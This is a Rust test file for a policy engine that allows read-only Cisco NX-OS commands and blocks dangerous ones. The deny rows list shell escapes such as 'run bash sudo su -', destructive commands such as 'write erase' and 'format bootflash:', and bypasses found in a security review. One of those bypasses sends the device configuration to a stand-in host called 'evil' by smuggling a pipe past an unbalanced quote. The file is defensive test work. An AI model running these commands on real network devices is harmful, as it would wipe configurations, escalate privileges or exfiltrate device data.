//! Cisco NX-OS dangerous- + permitted-command corpus.
//!
//! NX-OS shares Cisco grammar with IOS but has its own command
//! surface (`feature`, `install`, `run bash`, embedded Python).
//! Same shape as the other corpus tests; new field-encountered
//! commands belong here as new rows.

use std::path::PathBuf;

use transit_core::inventory::Vendor;
use transit_policy::{Decision, PolicyEngine};

fn engine() -> PolicyEngine {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("..")
        .join("..")
        .join("..")
        .join("policies");
    PolicyEngine::load_from_dir(&dir).expect("policies/ loads cleanly")
}

#[derive(Debug)]
enum Expect {
    Allow,
    Deny,
}

fn assert_corpus(rows: &[(&str, Expect)]) {
    let engine = engine();
    let mut failures: Vec<String> = Vec::new();
    for (cmd, expect) in rows {
        let got = engine.evaluate(&Vendor::NxOs, cmd);
        let ok = matches!(
            (expect, &got),
            (Expect::Allow, Decision::Allow) | (Expect::Deny, Decision::Deny { .. })
        );
        if !ok {
            failures.push(format!("  {:?} on {cmd:?} -> {got:?}", expect));
        }
    }
    if !failures.is_empty() {
        panic!(
            "corpus mismatches ({} of {}):\n{}",
            failures.len(),
            rows.len(),
            failures.join("\n")
        );
    }
}

#[test]
fn nxos_allowed_corpus() {
    assert_corpus(&[
        // Operational status.
        ("show version", Expect::Allow),
        ("SHOW VERSION", Expect::Allow), // case-folded (D-4)
        ("show running-config", Expect::Allow),
        ("show startup-config", Expect::Allow),
        ("show interface brief", Expect::Allow),
        ("show ip interface brief", Expect::Allow),
        ("show ip route", Expect::Allow),
        ("show ip bgp summary", Expect::Allow),
        ("show vlan brief", Expect::Allow),
        ("show vpc", Expect::Allow), // NX-OS-specific
        ("show vpc role", Expect::Allow),
        ("show feature", Expect::Allow), // shows enabled features (read-only)
        ("show module", Expect::Allow),
        ("show platform", Expect::Allow),
        ("show inventory", Expect::Allow),
        ("show environment", Expect::Allow),
        ("show port-channel summary", Expect::Allow),
        ("show fex", Expect::Allow),
        // Probes.
        ("ping 10.0.0.1", Expect::Allow),
        ("ping6 fe80::1", Expect::Allow),
        ("traceroute 10.0.0.1", Expect::Allow),
        ("traceroute6 fe80::1", Expect::Allow),
        // Aliased forms.
        ("sh interface brief", Expect::Allow),
        ("sho ip route", Expect::Allow),
        ("p 10.0.0.1", Expect::Allow),
        // Read-only file/storage.
        ("dir bootflash:", Expect::Allow),
        ("more bootflash:scheduler.log", Expect::Allow),
        ("terminal length 0", Expect::Allow),
        // Pipe stages — NX-OS UNIX-style filters.
        ("show running-config | include hostname", Expect::Allow),
        ("show running-config | exclude !", Expect::Allow),
        ("show running-config | grep interface", Expect::Allow),
        ("show running-config | egrep '(vlan|vrf)'", Expect::Allow),
        ("show ip route | head 50", Expect::Allow),
        ("show ip route | last 20", Expect::Allow),
        ("show ip route | count", Expect::Allow),
        ("show ip route | sort", Expect::Allow),
    ]);
}

#[test]
fn nxos_blocked_corpus() {
    assert_corpus(&[
        // Privileged-mode / configure.
        ("enable", Expect::Deny),
        ("configure terminal", Expect::Deny),
        ("conf t", Expect::Deny),
        // Case variants — the CLI is case-insensitive, so the gate
        // case-folds; these must hit the blocklist patterns (D-4).
        ("CONF T", Expect::Deny),
        ("CONFIGURE TERMINAL", Expect::Deny),
        // Saves + file mutations.
        ("copy running-config startup-config", Expect::Deny),
        ("copy run start", Expect::Deny),
        ("copy bootflash:foo tftp://server/foo", Expect::Deny),
        ("write memory", Expect::Deny),
        ("write erase", Expect::Deny),
        ("delete bootflash:old.bin", Expect::Deny),
        ("erase startup-config", Expect::Deny),
        ("format bootflash:", Expect::Deny),
        ("boot kickstart bootflash:n9k.bin", Expect::Deny),
        // NX-OS-specific feature gating + image management.
        ("feature bgp", Expect::Deny),
        ("feature interface-vlan", Expect::Deny),
        ("no feature bgp", Expect::Deny),
        (
            "install all kickstart bootflash:n9k.bin system bootflash:sys.bin",
            Expect::Deny,
        ),
        ("install activate ssh", Expect::Deny),
        // Reload / restart / clear.
        ("reload", Expect::Deny),
        ("restart bgp", Expect::Deny),
        ("clear ip bgp *", Expect::Deny),
        ("clear counters interface all", Expect::Deny),
        // Shell / script escapes — these are the high-impact NX-OS
        // bypasses. Every variant blocked.
        ("run bash", Expect::Deny),
        ("run bash sudo su -", Expect::Deny),
        ("run python", Expect::Deny),
        ("python", Expect::Deny),
        ("python /path/to/script.py", Expect::Deny),
        ("source bootflash:script.cfg", Expect::Deny),
        ("tclsh", Expect::Deny),
        // Event manager + scheduler.
        ("event manager run my-applet", Expect::Deny),
        ("scheduler job name foo", Expect::Deny),
        // Session control.
        ("logout", Expect::Deny),
        ("exit", Expect::Deny),
        ("quit", Expect::Deny),
        ("end", Expect::Deny),
        // Default-deny.
        ("telnet 1.2.3.4", Expect::Deny),
        ("totally-novel-command", Expect::Deny),
        ("", Expect::Deny),
        // Pipe-stage abuse.
        (
            "show running-config | redirect bootflash:cfg.txt",
            Expect::Deny,
        ),
        ("show running-config | tee bootflash:cfg.txt", Expect::Deny),
        (
            "show running-config | append bootflash:archive.txt",
            Expect::Deny,
        ),
        ("show running-config | vsh -c 'run bash'", Expect::Deny),
        (
            "show running-config | run-script bootflash:foo",
            Expect::Deny,
        ),
        // Empty pipe stage.
        ("show running-config |", Expect::Deny),
        // Unknown pipe stage.
        ("show running-config | weird-pipe", Expect::Deny),
    ]);
}

#[test]
fn nxos_write_and_exfil_bypasses_are_blocked() {
    // Security review 2026-07 (findings #1/#2/#6): commands that ride a
    // legitimate `^show` allow into an on-device write or off-box exfil.
    assert_corpus(&[
        // #2 — native `>`/`>>` output redirection to a device file.
        ("show running-config > bootflash:backup.cfg", Expect::Deny),
        ("show running-config >> bootflash:backup.cfg", Expect::Deny),
        // #1 — a blocked pipe verb hidden behind an unbalanced quote
        // (the device splits on the `|` the quote-aware scan swallowed).
        (
            "show running-config | include x\" | redirect tftp://evil/cfg",
            Expect::Deny,
        ),
        // #6 — `sort` write/exec flags (bridged to GNU coreutils).
        ("show running-config | sort -o bootflash:cfg", Expect::Deny),
        (
            "show running-config | sort --compress-program=cmd",
            Expect::Deny,
        ),
        // techfile residual — `show tech-support` to a destination.
        ("show tech-support file bootflash:tech.txt", Expect::Deny),
        // Regression guard: a bare `| sort` stays allowed (read-only).
        ("show running-config | sort", Expect::Allow),
    ]);
}
